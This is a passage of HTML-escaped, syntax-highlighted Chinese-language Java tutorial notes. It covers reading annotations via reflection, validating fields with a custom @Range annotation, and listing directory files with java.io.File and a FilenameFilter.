&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>反射API读取Annotation：&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取Person定义的@Report注解:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">level&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用反射API读取&lt;code>Annotation&lt;/code>有两种方法。方法一是先判断&lt;code>Annotation&lt;/code>是否存在，如果存在，就直接读取：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二种方法是直接读取&lt;code>Annotation&lt;/code>，如果&lt;code>Annotation&lt;/code>不存在，将返回&lt;code>null&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>读取方法、字段和构造方法的&lt;code>Annotation&lt;/code>和Class类似。但要读取方法参数的&lt;code>Annotation&lt;/code>就比较麻烦一点，因为方法参数本身可以看成一个数组，而每个参数又可以定义多个注解，所以，一次获取方法参数的所有注解就必须用一个二维数组来表示。例如，对于以下方法定义的注解：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#75af00">@Range&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>要读取方法参数的注解，我们先用反射获取&lt;code>Method&lt;/code>实例，然后读取方法参数的所有注解：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取Method实例:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取所有参数的Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#111">annos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameterAnnotations&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个参数（索引为0）的所有Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">annos&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Annotation&lt;/span> &lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @Range注解
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @NotNull注解
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">NotNull&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>定义了注解，本身对程序逻辑没有任何影响，必须自己编写代码来使用注解&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FIELD&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ReflectiveOperationException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 遍历所有Field:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getFields&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取Field定义的@Range:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果@Range存在:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取Field的值:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果值是String:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 判断值是否满足@Range的min/max:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid field: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样一来，我们通过&lt;code>@Range&lt;/code>注解，配合&lt;code>check()&lt;/code>方法，就可以完成&lt;code>Person&lt;/code>实例的检查。注意检查逻辑完全是我们自己编写的，JVM不会自动给注解添加任何额外的逻辑。&lt;/p>
&lt;h2 id="io">IO&lt;/h2>
&lt;h3 id="filepath">File&amp;amp;Path&lt;/h3>
&lt;ul>
&lt;li>标准库&lt;code>java.io&lt;/code>提供&lt;code>File&lt;/code>对象来操作文件和目录，可以传入绝对路径和相对路径；即使传入的不存在也不报错，可以用&lt;code>isFile&lt;/code>, &lt;code>isDirectory&lt;/code>进行检查&lt;/li>
&lt;li>&lt;code>File&lt;/code>对象既可以表示文件，也可以表示目录，可以用&lt;code>getPath&lt;/code>(传入路径), &lt;code>getAbsolutePath&lt;/code>(绝对路径), &lt;code>getCanonicalPath&lt;/code>(规范路径)&lt;/li>
&lt;li>当File对象表示一个目录时，可以使用&lt;code>list()&lt;/code>和&lt;code>listFiles()&lt;/code>列出目录下的文件和子目录名，&lt;code>listFiles()&lt;/code>提供了一系列重载方法，可以过滤不想要的文件和目录&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;C:\\Windows&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 列出所有文件和子目录
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FilenameFilter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 仅列出.exe文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 返回true表示接受该文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
